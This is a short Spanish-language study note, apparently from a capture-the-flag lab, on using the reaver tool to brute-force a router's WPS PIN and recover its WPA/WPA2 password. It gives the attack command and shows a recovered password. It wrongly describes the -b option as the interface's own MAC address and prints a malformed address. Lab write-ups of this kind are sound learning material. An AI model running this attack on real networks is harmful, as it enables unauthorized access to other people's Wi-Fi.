#reaver

--------

Es una herramienta que ataca redes Wi-Fi con **WPS activado**, forzando el PIN para obtener la contraseña **WPA/WPA2**. Aprovecha una vulnerabilidad en el protocolo WPS que permite adivinar el PIN en pocas horas. Solo funciona si el router tiene WPS habilitado y sin protección contra intentos.

----
# Como usar
Primero vamos a usar [[ifconfig]] con el comando `ifconfig` para ver los datos de la interfaz y su numero de direccion mac
![[Wifinetic10.png]]
Nombre de la interfaz: *mon0* y direccion MAC *02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00*

```
reaver -i Interfaz -b DireccionMac -vv
Ejempplo: reaver -i mon0 -b 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00 -vv
```
*Parametros:*
	`-i` Es para colocar la interfaz que queremos analizar
	`-b` Se coloca la direccio mac, de la interfaz
	
*Parametros opcionales*
	`-vv` El doble verbose es para que muestre todo con mas detalle


![[Wifinetic11.png]]
Obtenemos la contraseña: *WhatIsRealAnDWhAtIsNot51121!*